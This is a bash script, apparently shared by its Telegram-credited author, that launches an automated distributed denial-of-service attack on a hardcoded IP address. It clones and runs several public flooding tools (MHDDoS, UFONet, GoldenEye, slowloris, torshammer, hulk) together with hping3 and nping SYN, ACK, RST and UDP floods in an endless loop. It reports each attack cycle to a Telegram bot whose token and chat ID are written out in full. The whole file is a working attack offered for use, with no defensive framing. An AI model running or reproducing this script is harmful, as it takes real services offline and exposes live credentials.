#!/bin/bash

# ================================
# 🔥 BLACK DEMON AUTO ULTRA DESTROYER
# Creator: @YYJY (Telegram)
# ================================

TARGET="http://142.132.142.215"
TG_CHAT_ID="1512019208"
TG_BOT_TOKEN="7839039664:AAGagYQAmHcTW7kVHX3wyEK6Y-2spvJ2IWE"
LOG_DIR=~/logs
mkdir -p $LOG_DIR

# ✅ Install all tools silently
apt update -y && apt install -y curl wget git hping3 nmap iproute2 net-tools tor python3 python3-pip zenity dnsutils

# ✅ Cloning attack tools if needed
[[ ! -d "ufonet" ]] && git clone https://github.com/epsylon/ufonet.git
[[ ! -d "MHDDoS" ]] && git clone https://github.com/MHProDev/MHDDoS.git && pip3 install -r MHDDoS/requirements.txt
[[ ! -d "GoldenEye" ]] && git clone https://github.com/jseidl/GoldenEye.git
[[ ! -d "slowloris" ]] && git clone https://github.com/gkbrk/slowloris.git
[[ ! -d "torshammer" ]] && git clone https://github.com/dotfighter/torshammer.git
[[ ! -d "hulk" ]] && git clone https://github.com/grafov/hulk.git

# ✅ Update proxies
wget -q -O MHDDoS/socks5.txt https://raw.githubusercontent.com/MHProDev/MHDDoS/master/files/socks5.txt
wget -q -O MHDDoS/http.txt https://raw.githubusercontent.com/MHProDev/MHDDoS/master/files/http.txt

# ✅ Setup iptables protection
iptables -F
iptables -X
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT

# 🔔 Telegram notify
send_telegram() {
curl -s -X POST https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage -d chat_id=$TG_CHAT_ID -d text="$1"
}

# 🧠 Cloudflare bypass (cookie simulation)
bypass_cf() {
    curl -s -c - "$TARGET" | grep '__cfduid' | awk '{print $7}' > /dev/null
}

# 🔎 Check if target is online
check_target() {
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 $TARGET)
  [[ "$STATUS" == "200" || "$STATUS" == "403" ]] && return 0 || return 1
}

# 🧨 Auto attack launcher
auto_attack() {
  send_telegram "💣 BLACK DEMON: Starting full attack on $TARGET"
  zenity --info --width=300 --height=100 --text="🔥 Launching Attack on $TARGET"

  # UFONet
  (cd ufonet && python3 ufonet -a "$TARGET" --attack --method GET --place HEAD --threads 2000 --bypass --tor --forceyes >> $LOG_DIR/demon.log 2>&1 &)
  # MHDDOS
  (cd MHDDoS && python3 start.py $TARGET 2500 90 socks5.txt http.txt >> $LOG_DIR/demon.log 2>&1 &)
  # GoldenEye
  (cd GoldenEye && python3 goldeneye.py "$TARGET" -w 200 >> $LOG_DIR/demon.log 2>&1 &)
  # slowloris
  (cd slowloris && python3 slowloris.py "$TARGET" >> $LOG_DIR/demon.log 2>&1 &)
  # torshammer
  (cd torshammer && python3 torshammer.py -t "$TARGET" -r 1000 -T >> $LOG_DIR/demon.log 2>&1 &)
  # hulk
  (cd hulk && python3 hulk.py "$TARGET" >> $LOG_DIR/demon.log 2>&1 &)

  # Root L4 Attacks
  IP=$(dig +short $(echo $TARGET | sed 's~http[s]*://~~' | cut -d '/' -f1))
  hping3 -S $IP -p 80 --flood &
  hping3 -A $IP -p 80 --flood &
  hping3 -R $IP -p 80 --flood &
  nping --udp -c 99999 --rate 9000 -p 80 $IP &
}

# ♻️ Loop
while true; do
  check_target
  if [[ $? -eq 0 ]]; then
    bypass_cf
    auto_attack
    sleep 60
    pkill -f ufonet
    pkill -f goldeneye
    pkill -f slowloris
    pkill -f torshammer
    pkill -f hulk
    pkill -f hping3
    pkill -f nping
    pkill -f start.py
    send_telegram "✅ Attack cycle complete. Cooling..."
  else
    send_telegram "🔴 Target seems offline. Sleeping."
    sleep 60
  fi
done
